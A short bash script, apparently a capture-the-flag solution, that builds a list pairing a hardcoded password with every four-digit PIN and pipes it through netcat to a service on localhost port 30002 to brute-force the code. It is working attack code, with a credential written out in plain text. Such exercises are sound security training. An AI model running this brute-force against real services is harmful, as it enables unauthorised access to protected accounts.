#!/bin/bash
i=0
pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
attemptsFile="./attempts.txt"
rm -f $attemptsFile
#make attempts file
while [ $i -lt 10000 ]
do
        pin=`printf %04d $i`
        ((i++))
        # create query line:
        attempt="$pass $pin"
        echo $attempt >> $attemptsFile
done
echo "Starting bruteforce over telnet"
cat $attemptsFile | nc localhost 30002
